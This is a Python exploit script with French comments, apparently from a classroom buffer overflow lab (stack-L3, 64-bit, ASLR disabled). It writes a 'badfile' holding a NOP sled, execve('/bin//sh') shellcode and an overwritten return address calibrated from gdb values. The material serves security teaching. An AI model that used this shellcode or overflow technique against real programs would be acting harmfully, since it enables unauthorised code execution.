#!/usr/bin/python3
# E3 Niveau 3 - calibrage de l'adresse de retour (stack-L3, 64 bits)
# Prend le decalage (en decimal) a ajouter a 'buffer' comme argument.
# Sert a trouver le bon decalage malgre l'ecart d'adresses entre gdb
# et l'execution directe. Mettre a jour rbp/buffer avec les valeurs
# relevees sous gdb (stack-L3-dbg, ASLR=0) : p $rbp ; p &buffer.
import sys

shellcode = (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

rbp    = 0x7fffffffd8f0
buffer = 0x7fffffffd820

offset = (rbp - buffer) + 8
start  = offset - len(shellcode)
ret    = buffer + int(sys.argv[1])

content[start:start + len(shellcode)] = shellcode

L = 8
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)
